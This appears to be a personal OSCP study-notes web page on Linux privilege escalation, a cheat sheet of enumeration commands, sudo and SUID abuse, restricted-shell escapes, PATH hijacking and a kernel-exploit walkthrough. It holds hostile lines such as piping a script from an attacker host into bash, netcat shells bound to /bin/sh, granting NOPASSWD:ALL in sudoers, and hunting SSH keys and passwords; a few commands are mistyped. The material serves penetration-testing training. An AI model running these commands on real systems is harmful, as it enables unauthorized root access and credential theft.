@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>linux privesc | OSCP Notes</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="linux privesc" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="based on: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" />
+<meta property="og:description" content="based on: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" />
+<link rel="canonical" href="http://localhost:4000/5-linux-privesc/4-2-linux-privesc/" />
+<meta property="og:url" content="http://localhost:4000/5-linux-privesc/4-2-linux-privesc/" />
+<meta property="og:site_name" content="OSCP Notes" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-08-03T20:23:57+00:00" />
+<script type="application/ld+json">
+{"@type":"Article","url":"http://localhost:4000/5-linux-privesc/4-2-linux-privesc/","headline":"linux privesc","dateModified":"2020-08-03T20:23:57+00:00","datePublished":"2020-08-03T20:23:57+00:00","description":"based on: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/siteicon.png"}},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="OSCP Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/css/main.css">
+		<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/"><img src="/images/emblem.svg" width="40" height="40" alt="OSCP Notes logo"></a>
+				OSCP Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/">Hack The Planet</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/0-basics/1-network-basics/">basics</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/0-basics/1-network-basics/">network basics</a></li>
+								
+									<li class="nav-item "><a href="/0-basics/2-metasploit-basics/">metasploit basics</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/1-recon-enum/1-0-passive-recon/">enum</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-0-passive-recon/">passive recon</a></li>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-1-port-scanning-server-side-enumeration/">PORT SCANNING</a></li>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-3-common-ports/">COMMON PORTS</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/2-web/0-initial-enumeration/">web</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/2-web/0-initial-enumeration/">initial methodology</a></li>
+								
+									<li class="nav-item "><a href="/2-web/LFI-RFI/">Local and Remote file inclusion</a></li>
+								
+									<li class="nav-item "><a href="/2-web/cms/">CMSs</a></li>
+								
+									<li class="nav-item "><a href="/2-web/command-injection/">command injection</a></li>
+								
+									<li class="nav-item "><a href="/2-web/csrf/">CSRF</a></li>
+								
+									<li class="nav-item "><a href="/2-web/sqli/">SQL Injections</a></li>
+								
+									<li class="nav-item "><a href="/2-web/ssl/">ssl</a></li>
+								
+									<li class="nav-item "><a href="/2-web/ssrf/">ssrf</a></li>
+								
+									<li class="nav-item "><a href="/2-web/upload-bypass/">upload-bypass</a></li>
+								
+									<li class="nav-item "><a href="/2-web/verb-tampering/">verb tampering</a></li>
+								
+									<li class="nav-item "><a href="/2-web/xee/">XXE</a></li>
+								
+									<li class="nav-item "><a href="/2-web/xss/">XSS</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/3-Exploiting/1-webshells/">exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/3-Exploiting/1-webshells/">webshells</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/2-shellcodes-compiling-deploying/">shellcodes , compiling and deploying</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/3-bypassing-AV/">bypassing AV</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/4-databases/">databases</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/6-reverse-shells/">Reverse Shells</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/4-win-privesc/1-initial/">win privesc</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/4-win-privesc/1-initial/">initial</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/10-always-install-elevated/">always install elevated</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/11-secondary-logon-ms16-032/">secondary logon handle</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/12-insecure-registry/">insecure registry permissions</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/13-intel-sysret/">intel sysret</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/14-runas/">runas</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/15-LFI-FILES/">LFI files</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/16-UAC/">UAC bypass</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/17-llmnr/">LLMNR and NBT-NS poisoning</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/2-stored-credentials/">stored credentials</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/3-kernel/">Kernel Vulns</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/4-dll-injection/">DLL Injection</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/5-weak-service-permissions/">weak services</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/6-dll-hijacking/">DLL hijacking</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/7-potato/">POTATOS</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/8-group-policies-preferences/">group policy preferences</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/9-unquoted-service-path/">unquoted service path</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a>
+							<ul>
+								
+									<li class="nav-item current"><a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a></li>
+								
+									<li class="nav-item "><a href="/5-linux-privesc/lin-security/">lin-security + GTFO bins</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/6-post-exploitation/4-0-windows-file-transfer/">post exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4-0-windows-file-transfer/">windows file transfer</a></li>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4-3-passwords+hash_attacks/">passwords attacks</a></li>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4.4-pivoting+tunneling/">pivoting+tunneling</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/7-varios/tips/">varios</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/7-varios/tips/">tips</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/8-cheatsheets/msfvenom/">cheatsheets</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/msfvenom/">msfvenom</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/nmap/">nmap</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/powershell/">powershell</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/tmux/">tmux</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/changelog/"></a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>linux privesc</h2>
+				<h3>linux privesc</h3>
+			</div>
+			<article class="content">
+				<hr />
+<p>based on:
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</p>
+
+<p>https://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections?next_slideshow=1</p>
+
+<p> </p>
+<h1 id="1-automatic-info-gathering"><strong>1 AUTOMATIC INFO GATHERING</strong></h1>
+<hr />
+<h3 id="linpeas">linPEAS</h3>
+<p>https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./linpeas.sh
+</code></pre></div></div>
+
+<h3 id="linenum">LinEnum</h3>
+<p>https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://attackerip/LinEnum.sh | /bin/bash
+./LinEnum.sh -t
+</code></pre></div></div>
+<h3 id="linuxprivchecker">Linuxprivchecker</h3>
+<p>http://www.securitysift.com/download/linuxprivchecker.py</p>
+
+<p> </p>
+<h1 id="2-manual-info-gathering"><strong>2 MANUAL INFO GATHERING</strong></h1>
+<hr />
+<h3 id="operating-system">Operating System</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/issue
+cat /etc/*-release
+cat /etc/lsb-release      # Debian based
+lsb_release -a
+cat /etc/redhat-release   # Redhat based
+</code></pre></div></div>
+<h3 id="user-info">user info</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id
+whoami
+last
+</code></pre></div></div>
+<h3 id="kernel">kernel</h3>
+
+<p>https://github.com/mzet-/linux-exploit-suggester</p>
+
+<p>https://github.com/jondonas/linux-exploit-suggester-2</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /proc/version
+uname -a
+uname -ar
+uname -mrs
+rpm -q kernel
+dmesg | grep Linux
+ls /boot | grep vmlinuz-
+</code></pre></div></div>
+<h3 id="environmental-variables">environmental variables</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/profile
+cat /etc/bashrc
+cat ~/.bash_profile
+cat ~/.bashrc
+cat ~/.bash_logout
+env
+set
+</code></pre></div></div>
+
+<h3 id="history">history</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/.bash_history
+~/.nano_history
+~/.atftp_history
+~/.mysql_history
+~/.php_history
+~/.viminfo
+</code></pre></div></div>
+
+<h3 id="application-services">Application services</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps aux
+ps -ef
+top
+cat /etc/services
+systemctl status (service)
+top
+service --status-all
+</code></pre></div></div>
+
+<h3 id="check-installed-programs-permissions-hidden-files">check installed programs, permissions, hidden files</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -lah
+ls -lah /usr/bin
+ls -lah /sbin
+yum list installed
+dpkg-query -l
+dpkg -l
+rpm -qa
+ls -lah /usr/share/applications | awk -F '.desktop' ' { print $1}'
+</code></pre></div></div>
+
+<h3 id="whats-running">Whats running?</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps aux
+netstat -antup
+</code></pre></div></div>
+
+<h3 id="whats-installed">whats installed?</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpkg -l
+rpm -qa (centOS/OpenSUSE)
+uname -a
+</code></pre></div></div>
+
+<h3 id="check-any-unmounted-drives">Check any unmounted drives</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/fstab  
+</code></pre></div></div>
+
+<h3 id="writable-by-current-user">Writable by current user</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / perm /u=w -user `whoami` 2&gt;/dev/null  
+find / -perm /u+w,g+w -f -user `whoami` 2&gt;/dev/null  
+find / -perm /u+w -user `whoami` 2&gt;/dev/nul  
+</code></pre></div></div>
+
+<h3 id="any-service-running-by-root">Any service running by root?</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps aux|grep "root"  
+/usr/bin/journalctl (Which is normally not readable by a user) &lt;&lt; cron job?  
+</code></pre></div></div>
+
+<h3 id="find-symlinks-and-what-they-point-to">Find symlinks and what they point to:</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -type l -ls
+</code></pre></div></div>
+
+<h2 id="using-pspy-to-monitor-process">using pspy to monitor process</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pspy
+</code></pre></div></div>
+<p> 
+ </p>
+<h1 id="3-sudo-abusing-and-misconfiguration"><strong>3 SUDO, abusing and misconfiguration</strong></h1>
+<hr />
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo su
+sudo -l ex:  (onuma) (NOPASSWD)/bin/tar  -&gt; sudo -u onuma /bin/tar
+sudo -i
+sudo /bin/bash
+sudo su-
+sudo ht
+pkexec visudo
+</code></pre></div></div>
+<p> 
+ </p>
+<h1 id="4-suid"><strong>4 SUID</strong></h1>
+<hr />
+
+<ul>
+  <li>suid:cuando se ejecuta el archivo se ejecuta con el permiso del owner (chmod 4000)</li>
+  <li>sgid: corre como el grupo del owner.(chmod 2000)</li>
+  <li>sticky bit: solo el owner puede borrar o renombrar adentro de la carpeta.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -g=s -type f 2&gt;/dev/null    # SGID
+find / -perm -u=s -type f 2&gt;/dev/null    # SUID
+
+find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID &lt; full search  
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in 'common' places: /bin, /sbin &lt; quicker  
+
+-find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null  
+
+find / perm /u=s -user "User name that you are looking for" 2&gt;/dev/null  
+</code></pre></div></div>
+
+<h3 id="find-suid-root-files">Find SUID root files</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -user root -perm -4000 -print  2&gt;/dev/null
+</code></pre></div></div>
+<h3 id="find-sgid-root-files">Find SGID root files:</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -group root -perm -2000 -print 2&gt;/dev/null
+</code></pre></div></div>
+<h3 id="find-suid-and-sgid-files-owned-by-anyone">Find SUID and SGID files owned by anyone:</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -4000 -o -perm -2000 -print  2&gt;/dev/null
+</code></pre></div></div>
+
+<p> 
+ </p>
+<h1 id="5-docker"><strong>5 DOCKER</strong></h1>
+<hr />
+<p>http://reventlov.com/advisories/using-the-docker-command-to-root-the-host</p>
+
+<p> 
+ </p>
+<h1 id="6-kernel"><strong>6 KERNEL</strong></h1>
+<hr />
+<p> 
+ </p>
+<h1 id="7-cron"><strong>7 CRON</strong></h1>
+<hr />
+<h3 id="syntax">syntax</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* * * * * &lt;command to be executed&gt;
+- - - - -
+| | | | |
+| | | | ----- Weekday (0 - 7) (Sunday is 0 or 7, Monday is 1...)
+| | | ------- Month (1 - 12)
+| | --------- Day (1 - 31)
+| ----------- Hour (0 - 23)
+------------- Minute (0 - 59)
+</code></pre></div></div>
+
+<h3 id="check">check</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/cron.d/*
+cat /var/spool/cron/*
+crontab -l
+cat /etc/crontab
+cat /etc/cron.(time)
+systemctl list-timers
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+</code></pre></div></div>
+<h2 id="option-1">option 1</h2>
+<p>editing the scripts run by cron:</p>
+<h3 id="adding-user">adding user:</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TODO
+</code></pre></div></div>
+<h3 id="reverse-shell">reverse shell:</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+
+<h2 id="option-2">option 2</h2>
+<p>if the files are not misconfigured, we can try to exploit the script if its behavior is insecure.</p>
+
+<p> 
+ </p>
+<h1 id="8-abusing-misconfigured-permissions"><strong>8 ABUSING misconfigured Permissions</strong></h1>
+<hr />
+<h3 id="private-ssh-keys">private ssh keys</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/.ssh/authorized_keys : specifies the SSH keys that can be used for logging into the user account
+~/.ssh/identity.pub
+~/.ssh/identity
+~/.ssh/id_rsa.pub
+~/.ssh/id_rsa
+~/.ssh/id_dsa.pub
+~/.ssh/id_dsa
+/etc/ssh/ssh_config  : OpenSSH SSH client configuration files
+/etc/ssh/sshd_config : OpenSSH SSH daemon configuration file
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2&gt;/dev/null
+find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2&gt;/dev/null
+cat /etc/sudoers
+cat /etc/passwd
+</code></pre></div></div>
+<h3 id="writable-file-and-nobody-files">Writable file and nobody files</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files  
+find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files  
+</code></pre></div></div>
+<h3 id="any-script-files-that-we-can-modify">Any script files that we can modify?</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -writable -type f -name "*.py" 2&gt;/dev/null     #find all python file that can be write by us  
+</code></pre></div></div>
+<h3 id="find-password">Find password</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grep -rnw '/' -ie 'pass' --color=always  
+grep -rnw '/' -ie 'DB_PASS' --color=always  
+grep -rnw '/' -ie 'DB_PASSWORD' --color=always  
+grep -rnw '/' -ie 'DB_USER' --color=always  
+</code></pre></div></div>
+<h3 id="find-incorrect-file-permision">Find incorrect file permision</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Find / -perm -2 ! -type l -ls 2&gt;/dev/null
+</code></pre></div></div>
+
+<h3 id="find-files-that-are-not-owned-by-any-user">Find files that are not owned by any user:</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -nouser -print  2&gt;/dev/null
+</code></pre></div></div>
+<h3 id="find-files-that-are-not-owned-by-any-group">Find files that are not owned by any group:</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -nogroup -print  2&gt;/dev/null
+</code></pre></div></div>
+<p> 
+ </p>
+<h1 id="9-getting-out-restricted-shells"><strong>9 GETTING OUT RESTRICTED SHELLS</strong></h1>
+<hr />
+
+<ul>
+  <li>fijate que variables de entorno hay  con env</li>
+  <li>corre ‘export -p’ para ver que variables son read only  y si hay alguna con permiso de escritura ( $PATH y $SHELL? :D )</li>
+  <li>check GTFO bins (https://gtfobins.github.com)
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>compgen -c # check available commands
+</code></pre></div>    </div>
+  </li>
+  <li>con ssh podes forzar tty
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh monitor@127.0.0.1 -i ~/.ssh/.monitor -t bash
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p> 
+ </p>
+<h1 id="10-path-hijacking"><strong>10 PATH HIJACKING</strong></h1>
+<hr />
+
+<p>si un cron corre un binario o script  SIN PATH  ,  ejemplo</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> cat /home/sarasa
+</code></pre></div></div>
+<p>dependiendo de los permisos podriamos cambiar el path de quien corre el comando y poner  PRIMERO el
+ path a donde metemos nuestro evil cat.</p>
+
+<h2 id="common">Common</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>si tenes chsh podes cambiar la shell a  /bin/bash
+bin/sh
+cp /bin/sh .; sh
+ftp -&gt; !/bin/sh
+gdb -&gt; !/bin/sh
+more/ less/ man -&gt; !/bin/sh
+vi -&gt; :!/bin/sh : cuando salis de vi terminas con la shell .
+scp -S /tmp/getMeOut.sh x y : Refer Breaking out of rbash using scp
+awk ‘BEGIN {system(“/bin/sh”)}’
+find / -name someName -exec /bin/sh ;
+tee: echo "Your evil code" | tee script.sh
+ssh username@IP -t "/bin/sh"
+ssh username@IP -t "bash --noprofile"
+bash
+perl -e 'exec "/bin/sh";'  
+/bin/sh -i  
+exec "/bin/sh";  
+echo os.system('/bin/bash')  
+/bin/sh -i  
+ssh user@$ip nc $localip 4444 -e /bin/sh  
+export TERM=linux  
+
+vi--&gt;       :!bash
+vi--&gt;       :set shell=/bin/bash:shell
+awk--&gt;      awk 'BEGIN {system("/bin/bash")}'
+find--&gt;     find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+perl--&gt;     perl -e 'exec "/bin/bash";'
+Nmap  
+    nmap -V     &lt;Nmap version 2.02 - 5.21 had an interactive mode  
+    nmap --interactive  
+    nmap&gt; !sh  
+
+Vim  
+    Modify system file, e.g. passwd?  
+    vim.tiny  
+    - Press ESC key  
+    :set shell=/bin/sh  
+    :shell  
+
+find  
+    touch pentestlab  
+    find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;  
+
+Bash  
+    bash -p      
+
+More  
+
+Less  
+    less /etc/passwd  
+    !/bin/sh  
+
+Nano  
+    Can you modify system file?  
+    Modify /etc/suoders  
+    \&lt;user&gt; ALL=(ALL) NOPASSWD:ALL  
+
+cp  
+    Use cp to overwrite passwd with a new password  
+
+</code></pre></div></div>
+<h3 id="vim">vim</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>:version
+:python3 import pty;pty.spawn("/bin/bash")
+</code></pre></div></div>
+<h2 id="usando-scripting-laguages">Usando scripting laguages.</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'import os; os.system("/bin/bash")
+perl -e 'exec "/bin/sh";'
+etc...
+</code></pre></div></div>
+
+<p> 
+ </p>
+<h1 id="10-examples"><strong>10 EXAMPLES</strong></h1>
+<hr />
+<h2 id="mysql-run-by-root">Mysql run by root</h2>
+<p>MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library
+https://www.exploit-db.com/exploits/1518/</p>
+
+<p>You can also try:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select sys_exec('echo test&gt;/tmp/test.txt');
+select sys_eval('echo test&gt;/tmp/test.txt');
+</code></pre></div></div>
+
+<h2 id="mempodipper">Mempodipper</h2>
+<p>steve dosent have privilage</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>steve@ubuntu:   cat /etc/shadow
+permission denied
+steve@ubuntu: cat /etc/issue
+ubuntu 11.10
+steve@ubuntu: uname -a
+linux ubu 3.0.0-12-generic &lt; por ahi es vulnerable el kernel
+</code></pre></div></div>
+
+<p>podemos buscar en exploit database a ver que onda</p>
+
+<p>encontramos Mempodipper - Linux Local Root for &gt;=2.6.39, 32-bit and 64</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>steve@ubuntu: wget -O exploit.c http://www.exploit-db.com/download/18411
+steve@ubuntu: gcc exploit.c -o exploit
+steve@ubuntu: file exploit
+exploit: ELF etc......
+ste@ubuntu: id
+uid=10000 gid=10000 groups, etc
+steve@ubuntu: ./exploit
+#id
+uid=0(root)
+</code></pre></div></div>
+<h2 id="wget-without-wget">wget without wget</h2>
+<p>nformation about Bash Built-in /dev/tcp File (TCP/IP)</p>
+
+<p>The following script fetches the front page from Google:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec 3&lt;&gt;/dev/tcp/www.google.com/80
+echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" &gt;&amp;3
+cat &lt;&amp;3
+</code></pre></div></div>
+
+<p>The first line causes file descriptor 3 to be opened for reading and writing on the specified TCP/IP socket. This is a special form of the exec statement. From the bash man page:</p>
+
+<p>Second line: After the socket is open we send our HTTP request out the socket with the echo … &gt;&amp;3 command. The request consists of:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
+host: http://www.google.com
+Connection: close
+</code></pre></div></div>
+
+<p>Each line is followed by a carriage-return and newline, and all the headers 2are followed by a blank line to signal the end of the request (this is all standard HTTP stuff).</p>
+
+<p>Third line: Next we read the response out of the socket using cat &lt;&amp;3, which reads the response and prints it out.</p>
+
+<p> 
+ </p>
+<h2 id="11-wildcards-"><strong>11 wildcards ?</strong></h2>
+<hr />
+<p>hay algun cron corriendo con wildcards?
+ 
+ </p>
+<h2 id="12-linux-capabilities"><strong>12 linux capabilities</strong></h2>
+<hr />
+<ul>
+  <li>find cap  files
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getcat -r * 2&gt;/dev/null
+</code></pre></div>    </div>
+  </li>
+  <li>creating an evil cap
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[root@centos7-1 mnt]# cp -p /bin/bash /mnt/myBash
+[root@centos7-1 mnt]# setcap all+epi /mnt/myBash
+[root@centos7-1 mnt]# getcap /mnt/myBash
+/mnt/myBash =eip
+</code></pre></div>    </div>
+    <p>then</p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/mnt/myBash --inh-caps +all --reuid 0 /bin/bash
+# root
+</code></pre></div>    </div>
+    <p>(no mne funco en debian)</p>
+  </li>
+</ul>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
